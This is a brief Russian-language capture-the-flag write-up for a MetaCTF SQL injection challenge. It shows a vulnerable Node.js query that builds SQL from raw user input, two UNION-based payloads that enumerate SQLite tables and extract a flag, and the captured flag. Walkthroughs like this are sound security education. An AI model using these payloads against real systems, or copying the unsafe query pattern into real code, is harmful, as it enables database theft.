# Yummy Vegetables

Я люблю свои овощи, но никогда не могу вспомнить, какого они цвета! Я знаю,
что у многих есть эта проблема, поэтому я создал [сайт](http://host.cg21.metaproblems.com:4010/), чтобы помочь.

Вот немного соуса к овощам: `index.js`

---

Уязвимая строка

    const query = `SELECT * FROM veggies WHERE name LIKE '%${req.body.query}%';`;

Можно сотавить запрос который названия таблицы в базе

    %' and 0 UNION SELECT name, null, null FROM  sqlite_schema WHERE type ='table' AND name NOT LIKE 'sqlite_%';--

Взять поле flag из таблицы the_flag...

    %' and 0 UNION SELECT flag, null, null FROM the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5;--

    # MetaCTF{sql1t3_m4st3r_0r_just_gu3ss_g0d??}
